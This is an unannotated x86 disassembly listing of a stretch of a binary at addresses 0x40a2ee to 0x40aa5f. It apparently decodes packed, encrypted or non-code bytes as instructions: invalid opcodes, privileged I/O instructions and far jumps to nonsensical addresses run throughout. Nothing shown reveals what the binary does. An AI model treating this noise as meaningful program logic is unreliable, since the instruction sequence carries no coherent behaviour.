  40a2ee:	sbb    eax,DWORD PTR [edi-0x4c]
  40a2f1:	loope  0x40a331
  40a2f3:	fidiv  DWORD PTR [esp+ecx*1+0x5b76fc68]
  40a2fa:	std    
  40a2fb:	repz dec edi
  40a2fd:	jne    0x40a363
  40a2ff:	lods   al,BYTE PTR ds:[esi]
  40a300:	pop    edi
  40a301:	hlt    
  40a302:	sub    DWORD PTR [eax],esp
  40a304:	jmp    FWORD PTR [eax+0x45]
  40a307:	fcom   QWORD PTR [eax]
  40a309:	mov    dl,0xbd
  40a30b:	(bad)  
  40a30c:	fwait
  40a30d:	lock dec ecx
  40a30f:	inc    eax
  40a310:	mov    al,0x2b
  40a312:	push   ebp
  40a313:	or     DWORD PTR [esi+esi*4],0x19
  40a317:	leave  
  40a318:	pusha  
  40a319:	shl    DWORD PTR [edi+0x464d5dcb],cl
  40a31f:	test   BYTE PTR [eax+eiz*4],bh
  40a322:	pop    ss
  40a323:	call   0xd1f1a914
  40a328:	sub    dh,0xd6
  40a32b:	mov    DWORD PTR [edx-0x9],eax
  40a32e:	int3   
  40a32f:	rol    BYTE PTR [edx],0x27
  40a332:	imul   ebp,DWORD PTR [edi+0x24],0xb
  40a336:	sbb    cl,BYTE PTR [edi-0x7130fb54]
  40a33c:	pop    esi
  40a33d:	lods   al,BYTE PTR ds:[esi]
  40a33e:	lds    edx,FWORD PTR [edx-0x2ffeb508]
  40a344:	or     BYTE PTR [eax+esi*4-0x30fd82bb],dh
  40a34b:	xchg   DWORD PTR [edx],edi
  40a34d:	sbb    esp,eax
  40a34f:	mov    esp,0xd346f959
  40a354:	dec    esi
  40a355:	mov    edi,0x80db0567
  40a35a:	push   edx
  40a35b:	jb     0x40a3ca
  40a35d:	rcl    DWORD PTR [esp+edi*8],1
  40a360:	lds    esi,FWORD PTR [ebx+0x76]
  40a363:	aas    
  40a364:	xor    DWORD PTR [esi+eiz*8],0x642da444
  40a36b:	retf   0xdbaa
  40a36e:	lods   al,BYTE PTR ds:[esi]
  40a36f:	in     eax,0xbe
  40a371:	add    al,cl
  40a373:	(bad)  
  40a374:	out    0x85,al
  40a376:	repz and edi,esi
  40a379:	mov    cl,BYTE PTR [eax]
  40a37b:	div    DWORD PTR [eax-0x63af6907]
  40a381:	or     al,0xa3
  40a383:	sbb    BYTE PTR [edx],0x1
  40a386:	push   edi
  40a387:	mov    dh,0x1e
  40a389:	ud0    edi,ecx
  40a38c:	sbb    ebx,esi
  40a38e:	out    0x76,al
  40a390:	mov    eax,0x7df43767
  40a395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a396:	adc    dl,BYTE PTR [esi+ebp*1+0x6c]
  40a39a:	sbb    esi,DWORD PTR [ebx-0x8]
  40a39d:	loopne 0x40a329
  40a39f:	xchg   esi,eax
  40a3a0:	(bad)  
  40a3a1:	ins    BYTE PTR es:[edi],dx
  40a3a2:	mul    esp
  40a3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3a5:	adc    eax,0x837d9570
  40a3aa:	cmp    dh,cl
  40a3ac:	popa   
  40a3ad:	ficom  DWORD PTR [ebx+ebx*2+0x77]
  40a3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3b2:	dec    eax
  40a3b3:	jmp    0x6e68e34b
  40a3b8:	stc    
  40a3b9:	call   0x4fd88ad7
  40a3be:	pop    edi
  40a3bf:	sbb    edx,DWORD PTR [edx]
  40a3c1:	cwde   
  40a3c2:	call   DWORD PTR [eax-0x6]
  40a3c5:	and    cl,BYTE PTR es:[esi-0x7129ccc8]
  40a3cc:	retf   
  40a3cd:	aaa    
  40a3ce:	dec    edi
  40a3cf:	sub    dh,cl
  40a3d1:	dec    edx
  40a3d2:	pop    edi
  40a3d3:	daa    
  40a3d4:	or     al,0x57
  40a3d6:	cmp    al,0xbc
  40a3d8:	lods   al,BYTE PTR ds:[esi]
  40a3d9:	xor    al,0x90
  40a3db:	or     cl,BYTE PTR [eax+0x58]
  40a3de:	cld    
  40a3df:	mov    ebx,0xb9b1d933
  40a3e4:	stos   DWORD PTR es:[edi],eax
  40a3e5:	and    cl,dh
  40a3e7:	(bad)
  40a3eb:	dec    esp
  40a3ec:	test   al,0x8
  40a3ee:	mov    es,esp
  40a3f0:	aaa    
  40a3f1:	dec    ecx
  40a3f2:	sbb    esp,DWORD PTR [ebp-0x17f2aff6]
  40a3f8:	xor    al,dh
  40a3fa:	fmul   DWORD PTR [ecx]
  40a3fc:	ins    BYTE PTR es:[edi],dx
  40a3fd:	hlt    
  40a3fe:	jns    0x40a46b
  40a400:	repnz or dl,ah
  40a403:	shl    edx,1
  40a405:	lds    esi,FWORD PTR [ecx]
  40a407:	pop    ebx
  40a408:	inc    si
  40a40a:	push   ebp
  40a40b:	mov    dh,BYTE PTR [ebx-0x44564e61]
  40a411:	cli    
  40a412:	mov    WORD PTR [ebx+0x50],es
  40a415:	rcl    BYTE PTR [eax],0x2f
  40a418:	add    edx,ebx
  40a41a:	pop    ebx
  40a41b:	lds    edx,FWORD PTR [edi]
  40a41d:	mov    dh,0xf0
  40a41f:	ins    DWORD PTR es:[edi],dx
  40a420:	inc    ebx
  40a421:	in     al,0x6a
  40a423:	rcr    BYTE PTR [ebx+0x1dd84414],cl
  40a429:	imul   esp,DWORD PTR [ecx+0x36],0xffffffa9
  40a42d:	aaa    
  40a42e:	std    
  40a42f:	(bad)  
  40a430:	loope  0x40a47d
  40a432:	inc    ebx
  40a433:	sbb    BYTE PTR [edx],al
  40a435:	fs pop ds
  40a437:	adc    DWORD PTR [edi],ecx
  40a439:	pushf  
  40a43a:	ins    DWORD PTR es:[edi],dx
  40a43b:	pop    ss
  40a43c:	mov    al,ds:0xf724c94
  40a441:	out    dx,eax
  40a442:	jecxz  0x40a447
  40a444:	mov    ch,dh
  40a446:	pop    eax
  40a447:	xlat   BYTE PTR ds:[ebx]
  40a448:	addr16 lock and al,0xab
  40a44c:	push   ecx
  40a44d:	not    DWORD PTR [ecx]
  40a44f:	and    eax,0xe6fb822e
  40a454:	or     edi,DWORD PTR gs:[edi]
  40a457:	xchg   ebp,eax
  40a458:	jne    0x40a48a
  40a45a:	xchg   DWORD PTR [ebx-0x395a0158],ecx
  40a460:	mov    ebp,0xaa52b651
  40a465:	(bad)  
  40a466:	mov    esp,0x38c199f
  40a46b:	pusha  
  40a46c:	jb     0x40a4bb
  40a46e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a470:	jecxz  0x40a417
  40a472:	cmp    DWORD PTR [edx-0x536d7d98],ebp
  40a478:	inc    ebp
  40a479:	lods   eax,DWORD PTR ds:[esi]
  40a47a:	in     eax,dx
  40a47b:	xor    edx,ebx
  40a47d:	jmp    0x22724015
  40a482:	dec    ecx
  40a483:	in     eax,0x93
  40a485:	or     al,0xeb
  40a487:	adc    DWORD PTR ss:[edx+edi*2],ebx
  40a48b:	call   FWORD PTR [edx]
  40a48d:	shl    BYTE PTR [ebx],1
  40a48f:	idiv   BYTE PTR [ecx+edi*4-0x49]
  40a493:	fisub  WORD PTR [esp+edi*2]
  40a496:	loopne 0x40a47e
  40a498:	pop    eax
  40a499:	pop    esp
  40a49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a49b:	mov    DWORD PTR [ebx],ecx
  40a49d:	fcomp  DWORD PTR [ebx+0x472cd745]
  40a4a3:	aad    0xa3
  40a4a5:	dec    esi
  40a4a6:	addr16 mov al,0x4a
  40a4a9:	sub    al,0x60
  40a4ab:	stc    
  40a4ac:	pop    es
  40a4ad:	outs   dx,BYTE PTR ds:[esi]
  40a4ae:	mov    DWORD PTR [edi+ecx*1+0x2720535c],esi
  40a4b5:	add    al,0xcb
  40a4b7:	popa   
  40a4b8:	sub    eax,0x150d1e54
  40a4bd:	sub    ah,BYTE PTR [ecx-0x6f5394e1]
  40a4c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c4:	or     BYTE PTR [edx+esi*1],dh
  40a4c7:	test   DWORD PTR [esi-0xa],edx
  40a4ca:	pop    esp
  40a4cb:	xchg   ebx,eax
  40a4cc:	mov    ah,0x3f
  40a4ce:	inc    ecx
  40a4cf:	cdq    
  40a4d0:	sub    eax,0x2c449000
  40a4d5:	fldcw  WORD PTR [edx+0x29]
  40a4d8:	scas   al,BYTE PTR es:[edi]
  40a4d9:	and    bh,BYTE PTR [edi+0x28]
  40a4dc:	pop    ebp
  40a4dd:	int    0x48
  40a4df:	push   edx
  40a4e0:	xchg   edx,eax
  40a4e1:	call   0xaebfe7cb
  40a4e6:	lea    eax,[eax]
  40a4e8:	inc    edi
  40a4e9:	in     eax,0xdb
  40a4eb:	and    eax,0x6f9088f8
  40a4f0:	ds cs fcmovnu st,st(3)
  40a4f4:	or     ebp,ebp
  40a4f6:	addr16 mov cs,ebp
  40a4f9:	aam    0x9a
  40a4fb:	pop    esp
  40a4fc:	and    ebp,DWORD PTR [ecx]
  40a4fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4ff:	jle    0x40a524
  40a501:	push   0xffffff8e
  40a503:	clc    
  40a504:	jge    0x40a549
  40a506:	and    bh,BYTE PTR ds:0xedbdb6c1
  40a50c:	int    0x35
  40a50e:	loopne 0x40a4b6
  40a510:	inc    ebx
  40a511:	dec    eax
  40a512:	inc    ebx
  40a513:	inc    edi
  40a514:	retf   0xa16d
  40a517:	and    eax,0xdfa4568d
  40a51c:	lock jnp 0x40a524
  40a51f:	push   cs
  40a520:	and    BYTE PTR [ebp+0x54667c79],dl
  40a526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a527:	or     ebx,DWORD PTR [ecx-0x45629894]
  40a52d:	pop    ebx
  40a52e:	(bad)  
  40a52f:	loop   0x40a5b0
  40a531:	sub    ch,BYTE PTR [eax+0x59]
  40a534:	jmp    0x40a530
  40a536:	pop    edi
  40a537:	ret    
  40a538:	es push ecx
  40a53a:	cwde   
  40a53b:	das    
  40a53c:	dec    esp
  40a53d:	cmp    eax,0x17105b4a
  40a542:	fsub   QWORD PTR [edx-0x77489a09]
  40a548:	je     0x40a505
  40a54a:	sub    eax,0x5879eea
  40a54f:	mov    esp,0xbb276d46
  40a554:	es dec eax
  40a556:	inc    edx
  40a557:	mov    cl,0xbf
  40a559:	mov    esp,0x27f58dd1
  40a55e:	mov    ebx,fs
  40a560:	jae    0x40a550
  40a562:	sbb    eax,0x58cfc762
  40a567:	or     dl,dh
  40a569:	push   edx
  40a56a:	mov    ebx,DWORD PTR [ebp+0xed663d4]
  40a570:	or     esp,esi
  40a572:	arpl   WORD PTR ds:0x9c6497eb,cx
  40a578:	and    esi,esi
  40a57a:	sbb    al,0xb5
  40a57c:	pop    esi
  40a57d:	test   BYTE PTR [edi],cl
  40a57f:	leave  
  40a580:	ret    0x205d
  40a583:	dec    eax
  40a584:	(bad)  
  40a586:	jmp    0x6e3e:0x25c8b1a8
  40a58d:	or     eax,0x14f1fe60
  40a592:	mov    dl,0x8e
  40a594:	push   cs
  40a595:	jno    0x40a607
  40a597:	enter  0x2d99,0x85
  40a59b:	fs add ax,0x9ca0
  40a5a0:	dec    ebp
  40a5a1:	ret    0x3032
  40a5a4:	add    DWORD PTR [edi+eax*1-0x2f37dfca],ebp
  40a5ab:	inc    ebx
  40a5ac:	cmp    eax,0x2e962fdb
  40a5b1:	sbb    DWORD PTR [ecx],edx
  40a5b3:	sub    bh,BYTE PTR [ebp+0x28d63a0a]
  40a5b9:	dec    eax
  40a5ba:	xor    BYTE PTR [ebx-0x21640cf6],ah
  40a5c0:	mov    esp,0xe90890
  40a5c5:	mov    DWORD PTR [ecx-0x56],edi
  40a5c8:	out    0xd3,al
  40a5ca:	mov    bh,0x51
  40a5cc:	and    edi,DWORD PTR [esi+edx*8+0x3a9c13e1]
  40a5d3:	fst    DWORD PTR [edi+0x1]
  40a5d6:	dec    esi
  40a5d7:	mov    bl,0xcd
  40a5d9:	outs   dx,BYTE PTR ds:[esi]
  40a5da:	retf   0x96da
  40a5dd:	cmp    BYTE PTR ds:0xfafdd52f,0x65
  40a5e4:	lds    ecx,FWORD PTR [eax]
  40a5e6:	test   BYTE PTR [edi-0x42eff3e],ah
  40a5ec:	(bad)  
  40a5ed:	js     0x40a58e
  40a5ef:	bound  edx,QWORD PTR [edi-0x46]
  40a5f2:	mov    DWORD PTR [edx-0x47],edx
  40a5f5:	xor    al,0x9a
  40a5f7:	and    BYTE PTR ds:0x7c7c5f95,0x30
  40a5fe:	mov    edx,0xd11bd48a
  40a603:	dec    esp
  40a604:	cmp    bh,bh
  40a606:	(bad)  
  40a607:	repz fdiv QWORD PTR [edi]
  40a60a:	bound  esp,QWORD PTR [edx]
  40a60c:	mov    ds:0xcc762e40,al
  40a611:	in     eax,0x7d
  40a613:	or     edi,0x3d
  40a616:	ss mov ch,0xe2
  40a619:	xchg   ebx,eax
  40a61a:	ins    BYTE PTR es:[edi],dx
  40a61b:	ja     0x40a653
  40a61d:	or     DWORD PTR [ebp-0x8],ebp
  40a620:	ja     0x40a60c
  40a622:	xor    ch,BYTE PTR [edx+0x381460d6]
  40a628:	xchg   edx,eax
  40a629:	xchg   BYTE PTR [eax-0x5f200811],ah
  40a62f:	push   0x3c
  40a631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a632:	sbb    bh,BYTE PTR [esi+0x1e]
  40a635:	dec    edi
  40a636:	pop    edx
  40a637:	push   0x54
  40a639:	push   ds
  40a63a:	xor    DWORD PTR [edx-0x4965a100],ebx
  40a640:	in     al,dx
  40a641:	in     al,0xe
  40a643:	xchg   edx,eax
  40a644:	jbe    0x40a631
  40a646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a647:	pop    es
  40a648:	fsubr  QWORD PTR [edi-0x6efdb583]
  40a64e:	out    0xa2,eax
  40a650:	or     dl,ch
  40a652:	xchg   edi,eax
  40a653:	add    eax,0x6ac9b3e8
  40a658:	or     DWORD PTR [edi-0x13],eax
  40a65b:	mov    ch,0x94
  40a65d:	cmp    eax,0xb16d1f87
  40a662:	and    DWORD PTR [ebp-0x59],esi
  40a665:	sbb    dl,bh
  40a667:	sub    DWORD PTR [ebp+0x4e693347],ebx
  40a66d:	and    DWORD PTR [ecx],0x329eb188
  40a673:	push   0xffffff8d
  40a675:	fst    DWORD PTR [ebx]
  40a677:	jno    0x40a63a
  40a679:	cmp    DWORD PTR [edx+0x2f],edx
  40a67c:	xor    esp,DWORD PTR [ebp-0x62]
  40a67f:	push   eax
  40a680:	fwait
  40a681:	mov    esi,?
  40a683:	jo     0x40a6f3
  40a685:	inc    ebp
  40a686:	add    eax,0x832c6c6
  40a68b:	or     eax,0x5b7cb809
  40a690:	rol    al,0x7b
  40a693:	jnp    0x40a6a9
  40a695:	adc    dh,BYTE PTR [ebp-0xd]
  40a698:	pop    esp
  40a699:	push   edx
  40a69a:	jae    0x40a697
  40a69c:	je     0x40a6eb
  40a69e:	adc    ah,al
  40a6a0:	iret   
  40a6a1:	mov    edi,DWORD PTR [ebp+0x4cb8ff24]
  40a6a7:	pop    edx
  40a6a8:	jecxz  0x40a686
  40a6aa:	sbb    al,0x65
  40a6ac:	pop    fs
  40a6ae:	les    ebp,FWORD PTR [edx]
  40a6b0:	pop    edx
  40a6b1:	ins    DWORD PTR es:[edi],dx
  40a6b2:	mov    ch,0xf2
  40a6b4:	imul   ebp,DWORD PTR [ebx-0x5d608b33],0xc1f1df95
  40a6be:	push   ecx
  40a6bf:	mov    dl,al
  40a6c1:	int3   
  40a6c2:	xchg   ecx,eax
  40a6c3:	mov    ds:0x9dbe3f3b,al
  40a6c8:	mov    eax,DWORD PTR [esi+0x2f]
  40a6cb:	das    
  40a6cc:	mov    eax,0xaba561ad
  40a6d2:	sbb    bh,BYTE PTR [ecx-0x991ab20]
  40a6d8:	jmp    0xac94026f
  40a6dd:	mov    WORD PTR [edi],?
  40a6df:	test   al,0x7e
  40a6e1:	dec    ebx
  40a6e2:	in     al,dx
  40a6e3:	inc    edi
  40a6e4:	in     eax,0x20
  40a6e6:	xchg   ebx,eax
  40a6e7:	inc    eax
  40a6e8:	xchg   ebx,eax
  40a6e9:	sbb    BYTE PTR [edx+eiz*2+0x16],ch
  40a6ed:	cdq    
  40a6ee:	pop    eax
  40a6ef:	sbb    dl,al
  40a6f1:	inc    edx
  40a6f2:	mov    ds:0xce6cec39,eax
  40a6f7:	dec    ecx
  40a6f8:	sbb    eax,DWORD PTR [ebx]
  40a6fa:	call   0x7efd:0x78e25dbb
  40a701:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a703:	lods   eax,DWORD PTR ds:[esi]
  40a704:	mov    ds:0xb91ddec8,al
  40a709:	cmp    DWORD PTR [edi-0x1a],esp
  40a70c:	and    DWORD PTR [esi+0x5e],edx
  40a70f:	add    DWORD PTR [ebx-0x55],ebx
  40a712:	fidiv  DWORD PTR [ecx-0x3151b0e6]
  40a718:	call   0x9b92:0x3bcb1994
  40a71f:	push   cs
  40a720:	test   DWORD PTR [ebx-0x1b],ebx
  40a723:	cmp    ebx,0xffffffeb
  40a726:	add    eax,0xb6119e35
  40a72b:	in     al,dx
  40a72c:	push   ss
  40a72d:	fs dec esi
  40a72f:	cs sahf 
  40a731:	or     al,0x43
  40a733:	test   eax,0x3af1eab
  40a738:	fucom  st(3)
  40a73a:	aas    
  40a73b:	iret   
  40a73c:	pop    ds
  40a73d:	xchg   esi,eax
  40a73e:	and    dh,BYTE PTR [ebx-0x4]
  40a741:	rcl    BYTE PTR [edx-0x42],0x49
  40a745:	shl    DWORD PTR [ebx+0x61da4b2f],1
  40a74b:	out    0x6,eax
  40a74d:	jmp    0x40a719
  40a74f:	mul    DWORD PTR [esi+0xc]
  40a752:	or     eax,ebp
  40a754:	stos   DWORD PTR es:[edi],eax
  40a755:	mov    ss,ebx
  40a757:	hlt    
  40a758:	add    al,0x66
  40a75a:	out    0xfa,eax
  40a75c:	pop    edx
  40a75d:	jmp    0x9d08d31b
  40a762:	fs mov esi,0xa1668f64
  40a768:	neg    BYTE PTR [ebx+0x15]
  40a76b:	mov    eax,ecx
  40a76d:	push   esp
  40a76e:	fcmovnb st,st(7)
  40a770:	and    al,0x46
  40a772:	ret    
  40a773:	xchg   DWORD PTR [edi-0x22],esp
  40a776:	jbe    0x40a7d3
  40a778:	gs jp  0x40a73d
  40a77b:	xor    DWORD PTR [eax],eax
  40a77d:	mov    ebp,0xacfd9151
  40a782:	push   ds
  40a783:	mov    bh,0x9
  40a785:	test   eax,0x6f2ce520
  40a78a:	sub    ch,BYTE PTR [edi+0x11]
  40a78d:	sahf   
  40a78e:	inc    edi
  40a78f:	(bad)  
  40a790:	fwait
  40a791:	mov    ds:0x52b0f0ee,eax
  40a796:	or     eax,0x6509fd46
  40a79b:	sbb    al,0x8e
  40a79d:	loope  0x40a7f2
  40a79f:	stos   BYTE PTR es:[edi],al
  40a7a0:	loope  0x40a7b8
  40a7a2:	pop    ebp
  40a7a3:	mov    esp,0x6759bef9
  40a7a8:	leave  
  40a7a9:	in     eax,0xa2
  40a7ab:	sar    DWORD PTR [eax],0x79
  40a7ae:	adc    dl,BYTE PTR [edx]
  40a7b0:	(bad)  
  40a7b1:	rcl    DWORD PTR [ebx],cl
  40a7b3:	or     BYTE PTR [ebp+ecx*1+0x94b252d],bl
  40a7ba:	add    DWORD PTR [esi+0x6f1cb2b],ebx
  40a7c0:	jmp    0xd9c5:0xac369a2b
  40a7c7:	ja     0x40a7d6
  40a7c9:	inc    ebp
  40a7ca:	dec    esi
  40a7cb:	inc    edx
  40a7cc:	jl     0x40a776
  40a7ce:	push   ds
  40a7cf:	fadd   st,st(5)
  40a7d1:	mov    al,0x4c
  40a7d3:	dec    edi
  40a7d4:	mov    BYTE PTR [esi+0x77fe46d],0xdd
  40a7db:	sbb    eax,0xe1821b23
  40a7e0:	loop   0x40a78f
  40a7e2:	push   cs
  40a7e3:	jp     0x40a788
  40a7e5:	fisttp WORD PTR [edi+edx*8-0x16b18d7b]
  40a7ec:	nop
  40a7ed:	fcomi  st,st(7)
  40a7ef:	sub    eax,0xf06858c1
  40a7f4:	cdq    
  40a7f5:	scas   eax,DWORD PTR es:[edi]
  40a7f6:	push   esi
  40a7f7:	jge    0x40a7cb
  40a7f9:	jo     0x40a82b
  40a7fb:	test   eax,0x99dbd06e
  40a800:	retf   0xb636
  40a803:	inc    esi
  40a804:	add    DWORD PTR ds:[edi+edx*8-0x54],ebx
  40a809:	add    ebx,DWORD PTR [esi-0x39ef6e68]
  40a80f:	les    esp,FWORD PTR [eax+edi*2-0x4581eadd]
  40a816:	dec    esi
  40a817:	cmp    eax,0xefbe0358
  40a81c:	xchg   edx,eax
  40a81d:	mov    ah,0xf
  40a81f:	test   DWORD PTR [ebp-0x433311cf],edi
  40a825:	ror    eax,cl
  40a827:	mov    eax,0xd3ca7387
  40a82c:	jg     0x40a85c
  40a82e:	sub    dl,BYTE PTR [edx]
  40a830:	sar    DWORD PTR [edi+0x5e],cl
  40a833:	jge    0x40a806
  40a835:	icebp  
  40a836:	test   eax,ebp
  40a838:	shl    DWORD PTR ds:0x8e4e7b7d,1
  40a83e:	mov    WORD PTR [ebx-0x44],cs
  40a841:	cmc    
  40a842:	in     eax,dx
  40a843:	dec    ecx
  40a844:	data16 mov ch,0x4c
  40a847:	lock fistp WORD PTR [edi+eiz*4+0x15]
  40a84c:	mov    dh,BYTE PTR [ebp-0x75cbe731]
  40a852:	(bad)  
  40a853:	out    0xa3,eax
  40a855:	(bad)  
  40a856:	imul   ebx,DWORD PTR [ecx-0x17],0x7e077ebd
  40a85d:	loop   0x40a852
  40a85f:	push   ebp
  40a860:	ret    0x9c2c
  40a863:	add    al,0x6b
  40a865:	mov    ebx,0x9cb7cde7
  40a86a:	fbstp  TBYTE PTR ds:0x4a6f8afa
  40a870:	sti    
  40a871:	xor    eax,DWORD PTR ss:[eax+0x1c]
  40a875:	sbb    edx,ebx
  40a877:	sbb    ebx,DWORD PTR [esi+0x2d9b3418]
  40a87d:	xchg   ecx,eax
  40a87e:	pop    eax
  40a87f:	or     eax,DWORD PTR [ecx]
  40a881:	dec    edx
  40a882:	(bad)  
  40a884:	int3   
  40a885:	lahf   
  40a886:	or     al,0x5
  40a888:	cmp    BYTE PTR [edi-0x50109145],al
  40a88e:	xor    esp,ecx
  40a890:	ret    
  40a891:	inc    esp
  40a892:	arpl   WORD PTR [eax-0x13e6e6c9],si
  40a898:	test   al,0xb
  40a89a:	int    0xcd
  40a89c:	repz (bad) 
  40a8a0:	sub    DWORD PTR [edi+0x6d],ecx
  40a8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a4:	out    dx,al
  40a8a5:	pusha  
  40a8a6:	cmc    
  40a8a7:	int3   
  40a8a8:	mov    ebp,0x7e0747e4
  40a8ad:	cmp    DWORD PTR [edx-0x622bb5fa],edi
  40a8b3:	adc    bl,ah
  40a8b5:	add    eax,DWORD PTR [esi]
  40a8b7:	sbb    al,0x84
  40a8b9:	arpl   WORD PTR [esi+esi*8+0x762a6f2d],si
  40a8c0:	and    al,0x5b
  40a8c2:	xlat   BYTE PTR ds:[bx]
  40a8c4:	adc    eax,0xa29edea7
  40a8c9:	repnz pop esi
  40a8cb:	inc    ebp
  40a8cc:	int    0x79
  40a8ce:	inc    esi
  40a8cf:	test   eax,0x7e04a33c
  40a8d4:	push   eax
  40a8d5:	inc    ecx
  40a8d6:	shr    BYTE PTR [ecx-0x5dfa6214],0x4c
  40a8dd:	outs   dx,BYTE PTR ds:[esi]
  40a8de:	loopne 0x40a880
  40a8e0:	cdq    
  40a8e1:	push   ecx
  40a8e2:	hlt    
  40a8e3:	push   ss
  40a8e4:	mov    esp,0x8b7db70d
  40a8e9:	mov    WORD PTR [ebx-0x66caba37],?
  40a8ef:	popf   
  40a8f0:	pusha  
  40a8f1:	push   eax
  40a8f2:	icebp  
  40a8f3:	popa   
  40a8f4:	mov    bl,0xea
  40a8f6:	sub    eax,0x49e08f8b
  40a8fb:	(bad)  
  40a8fd:	push   0xffffffbc
  40a8ff:	xlat   BYTE PTR ds:[ebx]
  40a900:	xor    ah,BYTE PTR [ecx+0x75812b44]
  40a906:	and    eax,0xbdcaa31f
  40a90b:	pop    ebx
  40a90c:	imul   ebx,DWORD PTR [edi+0x33cb64a8],0x440606
  40a916:	dec    esp
  40a917:	call   0xe77b27eb
  40a91c:	jns    0x40a92e
  40a91e:	mov    DWORD PTR [eax+0x31],esi
  40a921:	mov    ds:0xea57391d,al
  40a926:	scas   al,BYTE PTR es:[edi]
  40a927:	jb     0x40a97b
  40a929:	jbe    0x40a97b
  40a92b:	jmp    0x40a8f6
  40a92d:	mov    WORD PTR [eax-0x20542fae],es
  40a933:	adc    al,0x5a
  40a935:	mov    edi,0x10638630
  40a93a:	aad    0xc6
  40a93c:	test   bh,al
  40a93e:	fmul   st,st(7)
  40a940:	out    0xbb,eax
  40a942:	push   esi
  40a943:	lods   eax,DWORD PTR ds:[esi]
  40a944:	inc    esi
  40a945:	inc    edi
  40a947:	jns    0x40a8e1
  40a949:	aaa    
  40a94a:	add    ebx,DWORD PTR [eax-0x44f5a240]
  40a950:	jp     0x40a8ee
  40a952:	popf   
  40a953:	mov    bh,0xa4
  40a955:	pop    ss
  40a956:	and    al,0xb1
  40a958:	stc    
  40a959:	adc    edx,DWORD PTR [edi-0x126ce98e]
  40a95f:	es inc ecx
  40a961:	and    BYTE PTR [edi],bh
  40a963:	bound  esp,QWORD PTR [esi+esi*2+0x8]
  40a967:	xchg   BYTE PTR [ebp+ebp*8+0x3d],bh
  40a96b:	mov    edi,0x809b8dc7
  40a970:	outs   dx,DWORD PTR ds:[esi]
  40a971:	bound  esi,QWORD PTR [edx+eiz*2-0x2a27d715]
  40a978:	(bad)  
  40a97a:	push   esp
  40a97b:	pop    ebp
  40a97c:	mov    dh,0xcd
  40a97e:	cmp    al,0xef
  40a980:	xchg   ebx,eax
  40a981:	scas   al,BYTE PTR es:[edi]
  40a982:	ins    BYTE PTR es:[edi],dx
  40a983:	and    DWORD PTR [ebx+0x2b],edi
  40a986:	inc    ebx
  40a987:	adc    DWORD PTR [ecx+0x676b850f],edx
  40a98d:	mov    WORD PTR [eax],gs
  40a98f:	lods   eax,DWORD PTR ds:[esi]
  40a990:	xor    BYTE PTR [ebx+0x6d],al
  40a993:	sub    BYTE PTR [ebp-0x2e1a53b3],dh
  40a999:	into   
  40a99a:	mov    al,ds:0x27cea4ca
  40a99f:	cdq    
  40a9a0:	mov    esi,0x26b2f0da
  40a9a5:	cmp    ebp,DWORD PTR [ebx+0x34]
  40a9a8:	jno    0x40a938
  40a9aa:	pop    esp
  40a9ab:	iret   
  40a9ac:	in     eax,0x68
  40a9ae:	jno    0x40aa0a
  40a9b0:	hlt    
  40a9b1:	fisubr DWORD PTR [esp+ebx*1-0x2a0d8f93]
  40a9b8:	es sbb eax,0x43df0dc1
  40a9be:	outs   dx,BYTE PTR ds:[esi]
  40a9bf:	scas   al,BYTE PTR es:[edi]
  40a9c0:	push   esi
  40a9c1:	pop    ecx
  40a9c2:	pop    edi
  40a9c3:	push   ecx
  40a9c4:	pop    esi
  40a9c5:	jns    0x40a990
  40a9c7:	int3   
  40a9c8:	es stos BYTE PTR es:[edi],al
  40a9ca:	gs mov bl,0x46
  40a9cd:	ror    edi,cl
  40a9cf:	mov    edx,esi
  40a9d1:	sbb    BYTE PTR [ebp+0x4c9651c5],cl
  40a9d7:	mov    dl,0x62
  40a9d9:	popa   
  40a9da:	cmp    al,0x89
  40a9dc:	xor    al,0x8c
  40a9de:	add    ebx,DWORD PTR [edi]
  40a9e0:	and    al,0x10
  40a9e2:	add    DWORD PTR ds:0xd0aaa55c,0xffffff99
  40a9e9:	push   ebx
  40a9ea:	mov    ecx,0x77a29653
  40a9ef:	pop    es
  40a9f0:	dec    ecx
  40a9f1:	pop    eax
  40a9f2:	adc    al,0x54
  40a9f4:	jecxz  0x40aa09
  40a9f6:	popf   
  40a9f7:	mov    ds:0xacecfb21,eax
  40a9fc:	out    dx,al
  40a9fd:	cmp    cl,dh
  40a9ff:	mov    al,ds:0x31c5faab
  40aa04:	stos   BYTE PTR es:[edi],al
  40aa05:	xchg   DWORD PTR [ebp-0x75],esi
  40aa08:	xor    DWORD PTR [ebp+0x5120989d],eax
  40aa0e:	push   esp
  40aa0f:	jp     0x40a9df
  40aa11:	leave  
  40aa12:	xor    cl,BYTE PTR [edx-0x5c]
  40aa15:	pushf  
  40aa16:	std    
  40aa17:	mov    al,0x88
  40aa19:	mov    esi,0x7e117dc6
  40aa1e:	push   edx
  40aa1f:	(bad)  
  40aa20:	xor    al,0xbb
  40aa22:	fcomp  QWORD PTR [eax+0x1e]
  40aa25:	in     al,dx
  40aa26:	inc    esi
  40aa27:	lea    ecx,[ebp+0x5e]
  40aa2a:	sbb    bl,dh
  40aa2c:	jmp    0x9fa7:0xf14ad0a1
  40aa33:	shl    esi,0xf4
  40aa36:	adc    DWORD PTR [ebp+edx*2-0x6289e72b],ecx
  40aa3d:	fimul  DWORD PTR [ebx+0x65a9c009]
  40aa43:	fstp   QWORD PTR [ebx-0x2d]
  40aa46:	das    
  40aa47:	out    dx,eax
  40aa48:	jle    0x40aa84
  40aa4a:	(bad)  
  40aa4b:	push   DWORD PTR [esi+0xb3fd813]
  40aa51:	xchg   BYTE PTR [eax-0x6e],ah
  40aa54:	mov    edi,0x3b9e3204
  40aa59:	iret   
  40aa5a:	nop
  40aa5b:	icebp  
  40aa5c:	aad    0xcc
  40aa5e:	ret    
  40aa5f:	xchg   DWORD PTR [edi-0x3e95f897],eax
